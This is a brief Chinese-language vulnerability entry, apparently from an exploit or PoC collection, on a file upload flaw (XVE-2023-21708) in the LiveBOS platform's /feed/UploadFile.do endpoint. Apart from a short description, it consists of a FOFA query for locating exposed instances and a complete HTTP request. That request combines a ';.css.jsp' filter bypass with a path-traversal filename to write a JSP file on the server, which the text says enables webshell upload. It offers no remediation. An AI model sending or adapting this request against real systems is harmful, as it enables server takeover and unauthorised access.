# 灵动业务架构平台(LiveBOS)系统UploadFile.do接口文件上传漏洞(XVE-2023-21708)

LiveBOS灵动业务架构平台（简称LiveBOS）是顶点软件股份有限公司开发的一个对象型业务架构中间件及其集成开发工具。 LiveBOS /feed/UploadFile.do接口存在文件上传漏洞，攻击者可利用该漏洞上传Webshell，获取服务器权限。

## fofa

```yaml
app="LiveBOS-框架"
```

## poc

```yaml
POST /feed/UploadFile.do;.css.jsp HTTP/1.1
Host:
Httpsendrequestex: true
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 049266bd-e740-40bf-845f-bc511296894e
Accept-Encoding: gzip, deflate
Cookie: zhzbsessionname=35FF312409BF3CAC561D5BC776643A05
Content-Type: multipart/form-data;boundary=--------------------------688644671867822357584225
Content-Length: 222

----------------------------688644671867822357584225
Content-Disposition: form-data; name="NewFile"; filename="/../../../11.jsp"
Content-Type: text/plain

test
----------------------------688644671867822357584225—-
```

